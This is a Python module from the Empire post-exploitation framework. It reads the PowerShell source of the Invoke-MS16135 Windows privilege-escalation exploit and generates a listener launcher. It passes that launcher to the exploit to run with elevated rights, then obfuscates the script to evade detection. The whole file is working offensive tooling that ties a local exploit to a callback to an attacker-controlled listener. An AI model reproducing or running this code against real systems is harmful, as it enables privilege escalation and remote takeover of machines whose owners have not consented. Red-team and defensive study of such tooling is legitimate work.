from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        module_source = main_menu.installPath + "/data/module_source/privesc/Invoke-MS16135.ps1"
        try:
            f = open(module_source, 'r')
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        module_code = f.read()
        f.close()

        script = module_code

        # generate the launcher code without base64 encoding
        # generate the launcher code without base64 encoding
        listener_name = params['Listener']
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']

        # generate the PowerShell one-liner with all of the proper options set
        launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=False,
                                                       userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds)
        # need to escape characters
        launcher_code = launcher.replace("`", "``").replace("$", "`$").replace("\"", "'")
        
        script += 'Invoke-MS16135 -Command "' + launcher_code + '"'
        script += ';"`nInvoke-MS16135 completed."'

        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
        script = data_util.keyword_obfuscation(script)

        return script

